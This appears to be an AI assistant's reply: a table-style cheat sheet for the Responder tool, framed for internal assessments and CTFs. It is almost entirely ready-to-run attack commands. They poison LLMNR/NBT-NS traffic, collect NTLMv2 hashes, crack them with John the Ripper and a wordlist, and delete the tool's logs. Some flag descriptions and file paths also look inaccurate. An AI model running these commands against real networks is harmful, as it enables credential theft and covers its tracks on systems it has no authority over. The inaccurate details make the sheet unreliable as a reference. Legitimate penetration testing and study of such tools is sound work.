Here's a **clean, table-style Responder cheat sheet** with only the **necessary commands and real-world examples** — ideal for quick reference during internal assessments or CTFs.

---

### 🛠️ Responder Cheat Sheet – Essential Commands Only

|**Purpose**|**Command**|
|---|---|
|🔍 Identify your network interface|`ip a`|
|🚀 Start Responder (default setup)|`sudo responder -I ens5`|
|🧪 Analyze mode (no poisoning)|`sudo responder -I ens5 -A`|
|🎯 Poison only LLMNR & NBT-NS|`sudo responder -I ens5 -wrf`|
|🧼 Stop Responder|`sudo pkill responder`|
|🧹 Clear logs|`sudo rm -rf /var/log/responder/*`|
|📁 View captured hashes|`cat /var/log/responder/Responder-Session.log`|
|🔓 Crack captured NTLMv2 hash|`john --format=netntlmv2 --wordlist=rockyou.txt Responder-Session.log`|

---

💡 **Note:**

- Replace `ens5` with your actual network interface.
    
- Default Responder logs are in: `/var/log/responder/`
    

---

Would you like a downloadable version (PDF or Markdown)?